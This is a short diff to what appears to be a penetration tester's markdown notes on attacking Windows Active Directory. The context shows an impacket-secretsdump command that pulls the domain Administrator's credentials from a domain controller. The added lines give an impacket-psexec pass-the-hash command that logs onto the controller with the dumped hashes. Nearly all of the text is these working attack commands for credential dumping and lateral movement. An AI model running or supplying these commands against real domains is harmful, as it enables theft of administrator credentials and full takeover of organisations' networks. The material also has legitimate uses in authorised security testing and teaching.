@@ -20,3 +20,8 @@ and via Linux if we have credentials:
 ```bash
 impacket-secretsdump -just-dc-user Administrator corp.com/powerfulUser:"rubbishPassw0rd\!"@192.168.12.34
 ```
+Then just log onto the DC:
+```
+impacket-psexec administrator@192.168.dc.ip -hashes <LM HASH>:<NT HASH>
+```
+or by whatever other remote auth pass-the-hash methodology you have available.
